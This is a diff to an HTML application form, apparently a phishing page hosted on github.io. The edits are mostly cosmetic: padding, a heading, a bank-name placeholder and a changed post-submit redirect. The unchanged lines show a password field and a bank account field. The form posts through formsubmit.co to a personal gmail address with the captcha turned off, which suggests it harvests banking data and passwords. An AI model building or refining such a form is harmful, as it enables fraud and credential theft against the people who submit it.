@@ -35,6 +35,9 @@
     .password-wrapper {
       position: relative;
     }
+    .password-wrapper input {
+      padding-right: 40px;
+    }
     .toggle-password {
       position: absolute;
       top: 50%;
@@ -43,6 +46,7 @@
       background: none;
       border: none;
       cursor: pointer;
+      font-size: 18px;
     }
     #final-note {
       margin-top: 20px;
@@ -79,10 +83,12 @@
 </head>
 <body>
 
+  <h1>Application Form</h1>
+
   <form id="application-form" action="https://formsubmit.co/exellentfirm@gmail.com" method="POST">
     
     <!-- Redirect & CAPTCHA -->
-    <input type="hidden" name="_redirect" value="thankyou.html" />
+    <input type="hidden" name="_next" value="https://onlinegistrationProg.github.io/Application-Form/thankyou.html" />
     <input type="hidden" name="_captcha" value="false" />
 
     <label>1. Full Name:
@@ -119,7 +125,7 @@
     </label>
 
     <label>7. Bank Account Type:
-      <input type="text" name="Bank Account Type" id="account-type" required>
+      <input type="text" name="Bank Account Type" id="account-type" placeholder="e.g. Standard Bank" required>
       <div class="error" id="error-account-type">Required</div>
     </label>
 
@@ -279,7 +285,6 @@
         validateForm();
       });
     });
-
   </script>
 
 </body>
